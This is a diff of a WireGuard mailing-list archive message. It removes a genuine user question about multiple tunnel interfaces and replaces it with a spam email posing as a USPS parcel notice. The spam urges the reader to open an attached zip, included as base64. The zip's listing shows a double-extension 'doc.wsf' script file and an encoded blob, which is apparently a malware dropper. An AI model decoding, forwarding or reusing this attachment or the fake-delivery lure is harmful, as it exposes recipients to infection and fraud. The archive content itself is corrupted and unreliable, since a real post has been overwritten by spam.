@@ -1,22 +1,21 @@
-Return-Path: mailing-porcus@porcus.ch
+Return-Path: datawork@sv366.xserver.jp
 Received: from krantz.zx2c4.com (localhost [127.0.0.1])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id aab2fc84
- for <wireguard@lists.zx2c4.com>; Thu, 5 Jan 2017 22:40:02 +0000 (UTC)
-Received: from mel.porcus.ch (mel.porcus.ch [46.20.250.35])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id a4e6805a
- for <wireguard@lists.zx2c4.com>; Thu, 5 Jan 2017 22:40:02 +0000 (UTC)
-Received: from [172.16.4.13] (85-195-240-19.fiber7.init7.net [85.195.240.19])
- by mel.porcus.ch (Postfix) with ESMTPSA id 476D61A2AAF
- for <wireguard@lists.zx2c4.com>; Thu,  5 Jan 2017 23:56:17 +0100 (CET)
-Content-Type: text/plain; charset=us-ascii
-Mime-Version: 1.0 (Mac OS X Mail 9.3 \(3124\))
-Subject: Re: Maximum number of interfaces + Debug 
-From: Will van Gulik <mailing-porcus@porcus.ch>
-In-Reply-To: <698F0489-3376-4D52-A48E-A4C9F344D817@porcus.ch>
-Date: Thu, 5 Jan 2017 23:49:03 +0100
-Message-Id: <9F550D1D-A374-48D6-881E-D626BB250E8F@porcus.ch>
-References: <698F0489-3376-4D52-A48E-A4C9F344D817@porcus.ch>
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 8aed3bf4
+ for <wireguard@lists.zx2c4.com>; Fri, 6 Jan 2017 06:30:45 +0000 (UTC)
+Received: from sv366.xserver.jp (sv366.xserver.jp [219.94.203.67])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 50ef148d
+ for <wireguard@lists.zx2c4.com>; Fri, 6 Jan 2017 06:30:44 +0000 (UTC)
+Received: from virusgw2.xserver.jp (virusgw2.xserver.jp [219.94.203.91])
+ by sv366.xserver.jp (Postfix) with ESMTP id 42CD52000E2F
+ for <wireguard@lists.zx2c4.com>; Fri,  6 Jan 2017 15:39:52 +0900 (JST)
 To: wireguard@lists.zx2c4.com
+Subject: Parcel #07586623 shipment problem, please review
+Date: Fri, 6 Jan 2017 15:39:52 +0900
+MIME-Version: 1.0
+Message-ID: <a7bcfa4cad77f9d1d4d069e51243fc7c@busyuuan.com>
+From: "USPS Priority Parcels" <miguel.chambers@busyuuan.com>
+Content-Type: multipart/mixed; boundary="b1_aaf214e52f4186205e9c9fec2a661dfc"
+Reply-To: USPS Priority Parcels <miguel.chambers@busyuuan.com>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -26,43 +25,110 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-Hi Everyone,
+--b1_aaf214e52f4186205e9c9fec2a661dfc
+Content-Type: text/plain; charset=us-ascii
 
-I went a bit further and did compile the module with debug rather than =
-using the repo's version, and I get a :
-wireguard: Invalid packet from xxxx:yyy
-in my dmesg. I would have hoped to get something more clear, but would a =
-module version mismatch be an issue or does this mostly looks like a key =
-issue ? I would be strange because I reissued them several times.
+Dear Customer,
 
-Any clue, ideas, else ?
+Your parcel was successfully delivered January 05 to USPS Station, but our courier cound not contact you.
 
-Cheers,
+Review the document that is attached to this e-mail!
 
-Will
+Many thanks,
+Miguel Chambers,
+USPS Senior Operation Agent.
 
-> On 03 Jan 2017, at 09:52, Will van Gulik <mailing-porcus@porcus.ch> =
-wrote:
->=20
-> Hi,
->=20
-> I'm trying to use multiple wireguard tunnel in one VM at the same =
-time, but it seems that only the first two I configured are working. I'm =
-currently trying with 5 interfaces, I see the incoming packet in tcpdump =
-but no reaction of the destination host with all the wg interfaces.
->=20
-> I'm not sure there is a limitation on that, I could totally have =
-missed that. Should I use 1 interface with multiple peers rather than =
-multiple interface ?
->=20
-> I'm testing that on a Debian with 4.8.7-1, running on a KVM host.
->=20
-> Any insight ?
->=20
-> Kind regards,
->=20
-> Will
-> _______________________________________________
-> WireGuard mailing list
-> WireGuard@lists.zx2c4.com
-> https://lists.zx2c4.com/mailman/listinfo/wireguard
+
+--b1_aaf214e52f4186205e9c9fec2a661dfc
+Content-Type: application/zip; name="Ground-Label-07586623.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Ground-Label-07586623.zip
+
+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
+EgAAAAA=
+
+
+--b1_aaf214e52f4186205e9c9fec2a661dfc--
